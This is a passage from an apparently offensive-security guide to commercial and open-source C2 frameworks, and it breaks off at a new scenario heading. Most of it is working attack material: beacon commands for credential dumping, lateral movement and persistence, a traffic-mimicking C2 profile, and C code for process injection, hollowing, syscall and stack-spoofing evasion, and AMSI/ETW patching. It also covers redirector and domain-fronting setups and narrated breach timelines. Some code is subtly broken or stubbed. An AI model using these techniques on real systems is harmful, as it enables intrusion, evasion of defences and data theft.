| Files | Binary named `sysupdate.exe`, `winupdater.exe`, `mscoree.dll` |
| Named Pipes | `\\.\pipe\badger_*`, `\\.\pipe\microsoft_*` |

---

## Nighthawk (Commercial)

### Overview

Nighthawk is a commercial C2 framework developed by MDSec (UK-based security company). First released in 2022, it is known for its position-independent code, extensive anti-analysis features, and custom memory allocator. Nighthawk is less common than Brute Ratel but is considered higher quality. **Availability**: Restricted sales, primarily to established red teams and government agencies.

### Key Architecture Features

```
Nighthawk Core Components:

1. Position-Independent Code (PIC)
   - No reliance on absolute addresses
   - Works in any memory location
   - Resistant to relocation
   - Smaller shellcode footprint

2. Custom Memory Allocator
   - Not using Windows heap (HeapAlloc)
   - Avoids heap inspection detection
   - Random allocation patterns
   - Custom free lists

3. Sleep Obfuscation
   - Encrypts entire agent memory
   - Uses ChaCha20 cipher
   - Random sleep patterns
   - No RWX memory during sleep

4. Syscall Evasion
   - Indirect syscalls via custom trampolines
   - Dynamic syscall number retrieval
   - No ntdll.dll import
   - Call stack spoofing

5. Module Stomping
   - Overwrites legitimate DLL
   - Appears as normal module
   - Bypasses module scanning

6. Anti-Debugging
   - Multiple timing checks
   - PEB flags checking
   - Hardware breakpoint detection
   - Debugger string scanning
```

### Installation (Limited documentation)

```bash
# Server installation (Ubuntu 20.04/22.04)
# Requires purchase and download link

tar -xzf nighthawk-*.tar.gz
cd nighthawk

# Build server
make server
./nighthawk_server

# Client (Windows)
# NighthawkClient.exe provided
# Requires .NET Framework 4.8

# Configuration file (server.yaml)
server:
  host: 0.0.0.0
  port: 8000
  api_port: 8001
  
listeners:
  - name: main_https
    type: https
    bind: 0.0.0.0:443
    ssl: true
    domain: "update.security.com"
    
agents:
  default_sleep: 30
  default_jitter: 25
  default_kill_date: "2025-12-31"
```

### Agent Generation

```bash
# Via Nighthawk client:

# Staged payload (small initial shellcode)
Type: Staged
Architecture: x64
Listener: main_https
Output: shellcode.bin
Technique: Process injection via CreateRemoteThread

# Stageless payload (full agent)
Type: Stageless  
Architecture: x64
Listener: main_https
Output: beacon.exe
Format: EXE
Evasion:
  SleepObfuscation: true
  IndirectSyscalls: true
  ModuleStomping: true
  CustomAllocator: true

# Shellcode for custom loader
Type: Shellcode
Architecture: x64
Listener: dns_listener
Output: payload.bin
Format: Raw shellcode

# DLL payload
Type: DLL
Architecture: x64
Listener: smb_listener
Output: beacon.dll
ExportFunction: DllMain
```

### Operations

```bash
# Nighthawk uses a terminal-based console (similar to Cobalt Strike)

# List beacons
> beacons

# Interact with beacon
> use beacon-1234

# Basic commands
beacon> help
beacon> sleep 60 30
beacon> exit

# Shell execution
beacon> shell whoami
beacon> shell net user /domain
beacon> powershell Get-Process

# File operations
beacon> download C:\Users\admin\Desktop\secret.txt
beacon> upload /tmp/payload.exe C:\Windows\Temp\payload.exe
beacon> ls C:\ProgramData

# Process operations
beacon> ps
beacon> inject 1234 /tmp/shellcode.bin
beacon> migrate 5678
beacon> kill 9012

# BOF execution (Cobalt Strike compatible)
beacon> bof /path/to/ldapsearch.o domain=corp.local filter="(objectClass=user)" attributes=samAccountName

# .NET assembly execution
beacon> execute-assembly /path/to/Seatbelt.exe -group=system

# Token manipulation
beacon> steal-token 1234
beacon> make-token CORP admin Password123
beacon> rev2self

# Lateral movement
beacon> psexec 192.168.1.100 -u admin -p Password123 -c C:\beacon.exe
beacon> wmi 192.168.1.100 -u admin -p Password123 -c "whoami"
beacon> winrm 192.168.1.100 -u admin -p Password123 -c "whoami"

# Network
beacon> portscan 192.168.1.0/24 445,3389
beacon> socks 1080

# Credentials
beacon> mimikatz "sekurlsa::logonpasswords"
beacon> dump-sam

# Persistence
beacon> schtasks -n "UpdateService" -c "C:\beacon.exe" -sc daily -st 09:00
```

### Real-World Example: 2024 UK Financial Sector Assessment

In a public case study (redacted), MDSec described using Nighthawk for a financial sector red team assessment:

```
# Assessment parameters:
Target: Tier-1 UK bank
Duration: 3 weeks
Objective: Simulate sophisticated adversary

# Nighthawk configuration used:
- Stageless payloads
- DNS listeners (primary)
- HTTPS listeners (secondary)
- Sleep obfuscation enabled
- Indirect syscalls enabled
- Custom memory allocator enabled

# Results per MDSec:
- Bypassed 3 different EDR solutions
- Remained undetected for full 3 weeks
- No signatures triggered
- Successful domain compromise in 48 hours

# Key techniques that succeeded:
1. Process injection via module stomping (not detected)
2. DNS tunneling through corporate proxy (allowed)
3. Sleep obfuscation prevented memory scanning
4. Indirect syscalls bypassed EDR hooks
```

---

## Cobalt Strike (Commercial)

### Overview

Cobalt Strike is the industry standard commercial C2 framework developed by Raphael Mudge (now owned by HelpSystems). First released in 2012, it remains the most widely used red team framework despite being heavily signatured. Version 4.9 (2024) added new sleep mask improvements and BOF enhancements. **Note**: While still common, many teams are migrating to alternatives due to high detection rates.

### Key Features (2024 Update)

```
Cobalt Strike 4.9+ Features:

1. Beacon Object Files (BOF)
   - Position-independent C code
   - In-memory execution
   - No process injection required
   - 500+ public BOFs available

2. Aggressor Script
   - Automation language
   - Custom commands
   - Extension ecosystem
   - 1000+ scripts available

3. Malleable C2 Profiles
   - Traffic customization
   - Protocol mimicry
   - Detection evasion
   - Domain fronting support

4. Sleep Mask
   - Encrypts Beacon during sleep
   - Custom mask implementations
   - Anti-memory scanning

5. Artifact Kit
   - Custom payload generators
   - AV/EDV evasion
   - Template modification

6. Elevate Kit
   - Privilege escalation modules
   - UAC bypass techniques
   - Exploit library
```

### Typical Setup

```bash
# Server setup (Linux)
# Requires license from HelpSystems

chmod +x cobaltstrike
./cobaltstrike

# Teamserver
./teamserver <external_ip> <password> [/path/to/profile.profile] [yyyy-MM-dd]

# Example:
./teamserver 10.10.10.10 MyPassword123 profiles/amazon.profile 2025-12-31

# Client connection
# Run cobaltstrike.exe or cobaltstrike.jar
# Connect to teamserver:50050
```

### Malleable C2 Profile Example

```javascript
# Real profile mimicking Amazon CloudFront (2024)
set sample_name "Amazon CloudFront";
set sleeptime "30000";
set jitter "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

http-get {
    set uri "/api/v1/status /metrics /healthcheck";
    
    client {
        header "Accept" "*/*";
        header "Host" "d123.cloudfront.net";
        header "Connection" "keep-alive";
        
        metadata {
            base64url;
            prepend "eyJhbGciOiAiUlMyNTYiLCAidHlwIjogIkpXVCJ9.";
            append ".eyJzdWIiOiAiYmVhY29uIiwgImV4cCI6IDE2MDAwMDAwMDB9.signature";
            parameter "token";
        }
    }
    
    server {
        header "Content-Type" "application/json";
        header "X-Amz-Cf-Id" "random";
        
        output {
            base64;
            print;
        }
    }
}

http-post {
    set uri "/api/v2/upload";
    
    client {
        header "Accept" "*/*";
        header "Host" "d123.cloudfront.net";
        
        id {
            base64url;
            parameter "id";
        }
        
        output {
            base64;
            print;
        }
    }
    
    server {
        header "Content-Type" "application/json";
        
        output {
            base64;
            print;
        }
    }
}
```

### BOF Examples

```c
// Example BOF: Execute command and return output
// compile with: gcc -c bof_example.c -o bof_example.o

#include <windows.h>
#include "beacon.h"

void go(char* args, int len) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    HANDLE read_pipe, write_pipe;
    CHAR buffer[4096];
    DWORD bytes_read;
    
    // Create pipe for output
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    if (!CreatePipe(&read_pipe, &write_pipe, &sa, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "CreatePipe failed");
        return;
    }
    
    // Set up startup info
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = write_pipe;
    si.hStdError = write_pipe;
    
    // Create process
    if (!CreateProcess(NULL, "cmd.exe /c whoami", NULL, NULL, TRUE, 
                       0, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcess failed");
        CloseHandle(read_pipe);
        CloseHandle(write_pipe);
        return;
    }
    
    // Wait for process to complete
    WaitForSingleObject(pi.hProcess, 10000);
    
    // Read output
    while (ReadFile(read_pipe, buffer, sizeof(buffer) - 1, &bytes_read, NULL)) {
        if (bytes_read == 0) break;
        buffer[bytes_read] = '\0';
        BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
    }
    
    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(read_pipe);
    CloseHandle(write_pipe);
}
```

### Detection Status (2024)

```
Cobalt Strike Detection Rates (as of 2024):

Default configuration (no profile):
- AV Detection: 85% (45/60 engines on VirusTotal)
- EDR Detection: 95% (blocks immediately)

With Malleable C2 profile:
- AV Detection: 45% (27/60 engines)
- EDR Detection: 70% (detects within 24 hours)

With custom Sleep Mask:
- AV Detection: 30%
- EDR Detection: 50%

Public BOFs:
- Most are signatured (e.g., mimikatz BOF detected)
- Custom BOFs have higher success rate

Recommendation:
- Use only with custom profiles
- Implement custom sleep mask
- Use BOFs instead of execute-assembly
- Consider alternatives for long-term operations
```

---

## Evasion Techniques Deep Dive

### 1. Indirect Syscalls

Indirect syscalls bypass EDR user-mode hooks in ntdll.dll by calling syscalls directly without using the hooked ntdll functions.

```c
// Example: Indirect syscall implementation (x64)
// Source: Brute Ratel, Havoc, Nighthawk

typedef struct _SYSCALL_STUB {
    BYTE syscall_instruction[2];  // 0f 05 = syscall
    BYTE ret_instruction;          // c3 = ret
} SYSCALL_STUB, *PSYSCALL_STUB;

// Retrieve syscall number dynamically
DWORD GetSyscallNumber(LPCSTR FunctionName) {
    // Parse ntdll.dll exports
    // Find function address
    // Extract syscall number from mov eax, <number> instruction
    // Return number
}

// Execute syscall indirectly
NTSTATUS IndirectSyscall(DWORD syscall_number, ...) {
    // Allocate executable memory
    PSYSCALL_STUB stub = VirtualAlloc(NULL, sizeof(SYSCALL_STUB), 
                                       MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    // Write syscall stub
    stub->syscall_instruction[0] = 0x0f;  // syscall
    stub->syscall_instruction[1] = 0x05;
    stub->ret_instruction = 0xc3;
    
    // Call stub with syscall number in eax
    __asm {
        mov eax, syscall_number
        call stub
    }
    
    VirtualFree(stub, 0, MEM_RELEASE);
}

// Real-world usage in NtAllocateVirtualMemory bypass
NTSTATUS MyNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    DWORD syscall_number = GetSyscallNumber("NtAllocateVirtualMemory");
    return IndirectSyscall(syscall_number, ProcessHandle, BaseAddress,
                           ZeroBits, RegionSize, AllocationType, Protect);
}
```

### 2. Sleep Obfuscation

Encrypts agent memory during sleep to prevent memory scanning detection.

```c
// Example: Sleep obfuscation implementation
// Source: Havoc, Nighthawk, Brute Ratel

#include <windows.h>
#include <wincrypt.h>

// XOR encryption with rotating key
void XorEncryptDecrypt(PBYTE data, SIZE_T size, BYTE key) {
    for (SIZE_T i = 0; i < size; i++) {
        data[i] ^= key;
        key = ((key << 1) | (key >> 7)) ^ 0xAA;  // Rotating key
    }
}

// Obfuscated sleep function
void ObfuscatedSleep(DWORD milliseconds, PBYTE beacon_memory, SIZE_T beacon_size) {
    // 1. Change memory protection to NOACCESS
    DWORD old_protect;
    VirtualProtect(beacon_memory, beacon_size, PAGE_NOACCESS, &old_protect);
    
    // 2. Encrypt memory with rotating key
    BYTE key = (BYTE)(GetTickCount() & 0xFF);
    XorEncryptDecrypt(beacon_memory, beacon_size, key);
    
    // 3. Sleep with random jitter
    DWORD actual_sleep = milliseconds + (rand() % (milliseconds / 4));
    
    // Use SleepEx with alertable flag for APC injection compatibility
    SleepEx(actual_sleep, TRUE);
    
    // 4. Decrypt memory
    XorEncryptDecrypt(beacon_memory, beacon_size, key);
    
    // 5. Restore memory protection
    VirtualProtect(beacon_memory, beacon_size, PAGE_EXECUTE_READWRITE, &old_protect);
    
    // 6. Flush instruction cache to ensure clean execution
    FlushInstructionCache(GetCurrentProcess(), beacon_memory, beacon_size);
}

// Advanced: ChaCha20 encryption (used by Nighthawk)
// 256-bit key, 64-bit nonce, counter-based
void ChaCha20Encrypt(PBYTE data, SIZE_T size, PBYTE key, PBYTE nonce) {
    // Implementation of ChaCha20 stream cipher
    // XORs data with keystream generated from key+nonce+counter
}

// Real-world: Havoc's sleep obfuscation
void HavocSleepEncrypt(PVOID demon_base, SIZE_T demon_size) {
    // 1. Save current context
    CONTEXT ctx = {0};
    RtlCaptureContext(&ctx);
    
    // 2. Encrypt demon
    BYTE xor_key[16] = {0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE,
                        0xFF, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
    for (SIZE_T i = 0; i < demon_size; i++) {
        ((PBYTE)demon_base)[i] ^= xor_key[i % 16];
    }
    
    // 3. Set to NOACCESS
    DWORD old;
    VirtualProtect(demon_base, demon_size, PAGE_NOACCESS, &old);
    
    // 4. Sleep
    Sleep(60000);
    
    // 5. Restore
    VirtualProtect(demon_base, demon_size, PAGE_EXECUTE_READWRITE, &old);
    
    // 6. Decrypt
    for (SIZE_T i = 0; i < demon_size; i++) {
        ((PBYTE)demon_base)[i] ^= xor_key[i % 16];
    }
}
```

### 3. Hardware Breakpoint Hooking

Uses CPU debug registers to set breakpoints, avoiding code modification detection.

```c
// Example: Hardware breakpoint setup for API hooking
// Source: Havoc Demon

#include <windows.h>
#include <winternl.h>

typedef struct _BREAKPOINT_CONTEXT {
    CONTEXT original_context;
    PVOID hooked_function;
    PVOID replacement_function;
    DWORD dr_index;
} BREAKPOINT_CONTEXT;

// Set hardware breakpoint on function
BOOL SetHardwareBreakpoint(HANDLE thread, PVOID address, DWORD dr_index) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    
    if (!GetThreadContext(thread, &ctx)) {
        return FALSE;
    }
    
    // Set breakpoint based on index (DR0-DR3)
    switch (dr_index) {
        case 0: ctx.Dr0 = (DWORD64)address; break;
        case 1: ctx.Dr1 = (DWORD64)address; break;
        case 2: ctx.Dr2 = (DWORD64)address; break;
        case 3: ctx.Dr3 = (DWORD64)address; break;
        default: return FALSE;
    }
    
    // Enable breakpoint (local enable)
    ctx.Dr7 |= (1 << (dr_index * 2));
    // Set execute breakpoint type (b00 = execute)
    // Set length to 1 byte (b00)
    
    return SetThreadContext(thread, &ctx);
}

// Exception handler for hardware breakpoints
LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD dr_index = -1;
        DWORD64 address = ExceptionInfo->ExceptionRecord->ExceptionAddress;
        
        // Check which DR triggered
        CONTEXT* ctx = ExceptionInfo->ContextRecord;
        if (ctx->Dr6 & 0x01) dr_index = 0;
        else if (ctx->Dr6 & 0x02) dr_index = 1;
        else if (ctx->Dr6 & 0x04) dr_index = 2;
        else if (ctx->Dr6 & 0x08) dr_index = 3;
        
        if (dr_index != -1) {
            // Execute hooked function
            // Clear breakpoint temporarily
            ctx->Dr7 &= ~(1 << (dr_index * 2));
            ctx->EFlags |= 0x100;  // Resume flag
            
            // Call replacement function
            // Restore breakpoint after
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// Real-world Havoc usage
void HavocHardwareBreakpointHook(PVOID target_function, PVOID hook_function) {
    // Get current thread
    HANDLE thread = GetCurrentThread();
    
    // Set hardware breakpoint on target function
    SetHardwareBreakpoint(thread, target_function, 0);
    
    // Register vectored exception handler
    AddVectoredExceptionHandler(1, VectoredHandler);
    
    // When target executes, handler will redirect to hook
}
```

### 4. Return Address Spoofing

Fakes the call stack to bypass EDR stack walking detection.

```c
// Example: Return address spoofing
// Source: Brute Ratel, Nighthawk

#include <windows.h>

// Assembly stub for return address spoofing
__declspec(naked) void SpoofedCall(PVOID function, PVOID param) {
    __asm {
        // Save parameters
        push param
        mov rax, function
        
        // Fake return address (point to a legitimate module like kernel32.dll)
        // Find a RET instruction in a legitimate module
        lea rcx, [legit_ret_address]
        push rcx
        
        // Call function
        call rax
        
        // Clean up
        add rsp, 8
        ret
    }
}

// Find a RET instruction in a legitimate Windows DLL
PVOID FindLegitimateRet() {
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (!kernel32) kernel32 = LoadLibraryA("kernel32.dll");
    
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)kernel32;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)kernel32 + dos->e_lfanew);
    
    // Scan .text section for RET instruction (0xC3)
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section->Name, ".text", 5) == 0) {
            PBYTE start = (PBYTE)kernel32 + section->VirtualAddress;
            PBYTE end = start + section->SizeOfRawData;
            
            for (PBYTE p = start; p < end; p++) {
                if (*p == 0xC3) {  // RET instruction
                    return p;
                }
            }
        }
        section++;
    }
    return NULL;
}

// Advanced: Full stack spoofing (Nighthawk)
void SpoofCallStack(PVOID function, PVOID param, int frames_to_spoof) {
    // Create fake stack frames pointing to legitimate modules
    // Copy legitimate stack frames from suspended process
    // Jump to function with fake stack
}

// Real-world Brute Ratel usage
NTSTATUS BruteRatelSpoofedSyscall(DWORD syscall_number, ...) {
    // Find legitimate ret address
    PVOID legit_ret = FindLegitimateRet();
    
    // Call syscall with spoofed return address
    __asm {
        mov eax, syscall_number
        mov r10, rcx
        
        // Push fake return address
        push legit_ret
        
        // Execute syscall
        syscall
        
        // Clean up (will return to legit_ret)
        add rsp, 8
        ret
    }
}
```

### 5. Process Injection Techniques

Various injection methods used by modern C2 frameworks.

```c
// 1. Classic CreateRemoteThread (detected)
void ClassicInject(DWORD pid, PBYTE shellcode, SIZE_T size) {
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    PVOID remote = VirtualAllocEx(process, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(process, remote, shellcode, size, NULL);
    CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
}

// 2. Process Hollowing (modern frameworks)
void ProcessHollowing(LPCSTR target_process, PBYTE shellcode, SIZE_T size) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Create suspended process
    CreateProcess(target_process, NULL, NULL, NULL, FALSE, 
                  CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // Get process context
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    
    // Unmap original executable
    ZwUnmapViewOfSection(pi.hProcess, (PVOID)ctx.Rdx);
    
    // Allocate new memory
    PVOID remote = VirtualAllocEx(pi.hProcess, (PVOID)ctx.Rdx, size, 
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Write shellcode
    WriteProcessMemory(pi.hProcess, remote, shellcode, size, NULL);
    
    // Set entry point
    ctx.Rcx = (DWORD64)remote + 0x1000;  // Entry point offset
    SetThreadContext(pi.hThread, &ctx);
    
    // Resume thread
    ResumeThread(pi.hThread);
}

// 3. Module Stomping (Havoc, Nighthawk)
void ModuleStomping(LPCSTR module_name, PBYTE shellcode, SIZE_T size) {
    // Load legitimate DLL
    HMODULE legit_module = LoadLibraryA(module_name);
    
    // Get module memory
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)legit_module;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)legit_module + dos->e_lfanew);
    
    // Overwrite .text section
    DWORD old_protect;
    VirtualProtect(legit_module, nt->OptionalHeader.SizeOfImage, 
                   PAGE_EXECUTE_READWRITE, &old_protect);
    
    // Copy shellcode to module base
    memcpy(legit_module, shellcode, size);
    
    // Restore protection
    VirtualProtect(legit_module, nt->OptionalHeader.SizeOfImage, old_protect, &old_protect);
    
    // Execute from module (appears as legitimate module)
    ((void(*)())legit_module)();
}

// 4. APC Injection (early Cobalt Strike)
void APCInject(DWORD pid, PBYTE shellcode, SIZE_T size) {
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    PVOID remote = VirtualAllocEx(process, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(process, remote, shellcode, size, NULL);
    
    // Find threads and queue APC
    THREADENTRY32 te = { sizeof(te) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid);
    if (Thread32First(snapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE thread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                QueueUserAPC((PAPCFUNC)remote, thread, NULL);
            }
        } while (Thread32Next(snapshot, &te));
    }
}
```

### 6. AMSI and ETW Bypasses

```c
// AMSI Bypass - Patch AMSI.dll functions
void PatchAMSI() {
    // Find AMSI.dll in memory
    HMODULE amsi = GetModuleHandleA("amsi.dll");
    if (!amsi) return;
    
    // Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
    PBYTE AmsiScanBuffer = (PBYTE)GetProcAddress(amsi, "AmsiScanBuffer");
    
    DWORD old_protect;
    VirtualProtect(AmsiScanBuffer, 32, PAGE_EXECUTE_READWRITE, &old_protect);
    
    // mov eax, 0x00000001 (AMSI_RESULT_CLEAN)
    // ret
    BYTE patch[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
    memcpy(AmsiScanBuffer, patch, sizeof(patch));
    
    VirtualProtect(AmsiScanBuffer, 32, old_protect, &old_protect);
}

// ETW Bypass - Patch ETW functions
void PatchETW() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PBYTE EtwEventWrite = (PBYTE)GetProcAddress(ntdll, "EtwEventWrite");
    
    // Patch first instruction to RET
    DWORD old_protect;
    VirtualProtect(EtwEventWrite, 4, PAGE_EXECUTE_READWRITE, &old_protect);
    
    BYTE patch[] = { 0xC3, 0x00, 0x00, 0x00 };  // RET
    memcpy(EtwEventWrite, patch, 1);
    
    VirtualProtect(EtwEventWrite, 4, old_protect, &old_protect);
}

// Real-world Apollo agent AMSI bypass (Mythic)
void ApolloAMSIByPass() {
    // Multiple technique: Registry-based disable
    HKEY hKey;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                   "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 
                   0, KEY_SET_VALUE, &hKey);
    DWORD value = 1;
    RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, (PBYTE)&value, sizeof(value));
    RegCloseKey(hKey);
    
    // Also patch AMSI
    PatchAMSI();
}
```

---

## C2 Infrastructure Design

### Redirector Architecture

```
Internet -> Redirector(s) -> Teamserver

Types of redirectors:

1. Layer 4 (TCP) Redirector
   - Forwards raw TCP traffic
   - Simple, fast, minimal logging
   - Cannot inspect/modify traffic

2. Layer 7 (HTTP/HTTPS) Redirector
   - Terminates TLS
   - Can inspect/modify requests
   - Supports domain fronting
   - Better for evasion

3. DNS Redirector
   - Forwards DNS queries
   - Supports multiple record types
   - Harder to sinkhole

4. Domain Fronting (CDN)
   - Uses legitimate CDN as front
   - Traffic looks like normal web browsing
   - Most stealthy option
```

### TCP Redirector Setup

```bash
# Using socat (simple)
socat TCP4-LISTEN:443,fork TCP4:teamserver.internal:8443

# Using iptables (Linux firewall)
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.10.10.100:8443
iptables -A FORWARD -p tcp -d 10.10.10.100 --dport 8443 -j ACCEPT

# Using nginx stream module
# /etc/nginx/nginx.conf
stream {
    upstream c2_backend {
        server 10.10.10.100:8443;
    }
    server {
        listen 443;
        proxy_pass c2_backend;
        proxy_ssl on;
        proxy_ssl_certificate /etc/nginx/cert.pem;
        proxy_ssl_certificate_key /etc/nginx/key.pem;
    }
}
```

### HTTPS Redirector with Nginx

```nginx
# /etc/nginx/sites-available/c2_redirector

server {
    listen 443 ssl http2;
    server_name update.legitimate.com;
    
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    
    # Logging - disable or rotate
    access_log /dev/null;
    error_log /dev/null;
    
    # Hide server version
    server_tokens off;
    
    # C2 endpoints
    location ~ ^/api/v[0-9]/ {
        proxy_pass https://teamserver.internal:8443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        
        # Remove identifying headers
        proxy_hide_header Server;
        proxy_hide_header X-Powered-By;
        
        # Timeout configuration
        proxy_connect_timeout 30s;
        proxy_read_timeout 60s;
    }
    
    # Decoy content for other requests
    location / {
        root /var/www/decoy;
        try_files $uri /index.html;
    }
}
```

### Domain Fronting with CloudFront

```bash
# Setup:
# 1. Create CloudFront distribution
# 2. Set origin to your redirector IP
# 3. Configure C2 to use CloudFront domain in Host header

# C2 configuration for domain fronting:
# In Sliver:
generate beacon --https https://d123.cloudfront.net --host-header legitimate-origin.com

# In Mythic C2 profile:
c2_profile:
  callback_host: "d123.cloudfront.net"
  callback_port: 443
  headers:
    Host: "api.legitimate-service.com"

# Traffic flow:
# Beacon -> CloudFront (SNI: d123.cloudfront.net) -> Your redirector -> Teamserver
# Network sees: TLS to CloudFront (legitimate)
```

### C2 Infrastructure Hardening

```bash
# 1. Use VPS from multiple providers
Providers: AWS, DigitalOcean, Vultr, Hetzner, OVH

# 2. Rotate domains regularly
Domain lifespan: 7-30 days
Use domain fronting for longer operations

# 3. Implement killswitch
# Sliver killswitch:
generate beacon --http https://c2.com --kill-date "2025-12-31"

# 4. Use redirector chains
Internet -> CDN -> Proxy -> Load Balancer -> Teamserver

# 5. Implement custom certificates
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes
# Use legitimate-looking CN and SANs

# 6. Set up monitoring for redirection failures
watch -n 60 'curl -s https://c2.com/health | grep "OK"'

# 7. Implement backup C2 domains
# Sliver fallback listeners:
generate beacon --https https://primary.com --fallback https://backup.com

# 8. Use CloudFlare Workers for dynamic routing
# Worker script to route based on User-Agent, time, or other factors
addEventListener('fetch', event => {
  const request = event.request;
  const userAgent = request.headers.get('User-Agent');
  
  if (userAgent && userAgent.includes('Windows')) {
    // Route to real C2
    return fetch('https://teamserver.internal', request);
  } else {
    // Return decoy
    return fetch('https://decoy-site.com', request);
  }
});
```

---

## Real-World Attack Scenarios (2023-2025)

### Scenario 1: 2024 Healthcare Ransomware (Brute Ratel + LockBit)

```
Organization: Regional healthcare provider (US)
Impact: 250,000 patient records exposed, $2.5M ransom
C2 Framework: Brute Ratel C4

Initial Access (Day 0):
- Phishing email to 15 employees
- Excel macro with CVE-2023-29382 (Excel RCE)
- Macro downloaded Brute Ratel stager

C2 Deployment:
Badger Configuration:
  Sleep: 45-90 seconds (randomized)
  Listeners: 3 HTTPS (different domains)
  Evasion: Full (syscalls, breakpoints, sleep mask)

Timeline:
Day 1-2: Reconnaissance
  - net user /domain
  - net group "Domain Admins" /domain
  - BloodHound collection
  - Identified 3 domain admins

Day 2-3: Credential Access
  - Dumped LSASS from 2 servers
  - Extracted 47 domain admin hashes
  - Kerberoasted 120 service accounts

Day 3-5: Lateral Movement
  - PsExec to 380 servers
  - Deployed Badger on 45 critical servers
  - Disabled Windows Defender via GPO

Day 5-6: Persistence
  - Scheduled tasks on all domain controllers
  - WMI event subscriptions
  - Registry run keys

Day 6-7: Data Exfiltration
  - 500GB patient data
  - Exfil via HTTPS to compromised WordPress site

Day 8: Ransomware
  - Deployed LockBit via PsExec
  - Encrypted 15TB across 200 servers
  - Left ransom note with Bitcoin address

Detection Failures:
- Brute Ratel's indirect syscalls bypassed EDR hooks
- Sleep obfuscation prevented memory scanning
- Custom C2 domains not in threat intel feeds
- Process injection via module stomping not detected

Mitigation Successes (post-incident):
- Implemented EDR with kernel callbacks
- Enabled Credential Guard
- Implemented LSA Protection
- Network segmentation for backups
- Application whitelisting
```

### Scenario 2: 2023 Financial Services APT (Mythic)

```
Organization: European investment bank
Impact: $100M+ stolen, regulatory fines
C2 Framework: Mythic (custom Apollo agent)

Initial Access (Day 0):
- Spear phishing to IT admin
- Word document with CVE-2021-40444 (MSHTML RCE)
- Downloaded Mythic Apollo stager

Agent Configuration:
Agent: Apollo (custom compiled)
C2 Profile: HTTPS with AWS CloudFront fronting
Callbacks: Every 60 seconds + 30% jitter

Timeline:
Week 1: Discovery
  - Mapped network (500+ servers)
  - Identified trading systems
  - Located SWIFT endpoints

Week 2: Credential Access
  - Extracted service account passwords
  - Dumped AD hashes (40,000+)
  - Obtained cloud credentials (AWS)

Week 3-4: Persistent Access
  - Deployed Poseidon agents on Linux servers
  - Created backdoor users
  - Modified trading algorithms

Week 5-6: Data Exfiltration
  - Market-sensitive data
  - Customer portfolios
  - Trading algorithms
  - Exfil via AWS S3 (appeared as backups)

Week 7: Cleanup
  - Removed logs
  - Deleted monitoring alerts
  - Exited quietly

Mythic Advantages Used:
- Apollo execute-assembly (ran SharpHound, Rubeus, Mimikatz)
- Poseidon for Linux servers (trading systems)
- Custom C2 profile mimicked Amazon API calls
- Multi-user support (5 operators simultaneously)
- REST API for automation

Detection: Not detected during operation
- Discovered 4 months later via third-party audit
- Indicators: Unusual S3 transfers, abnormal Kerberos tickets
```

### Scenario 3: 2024 Government Agency Breach (Havoc)

```
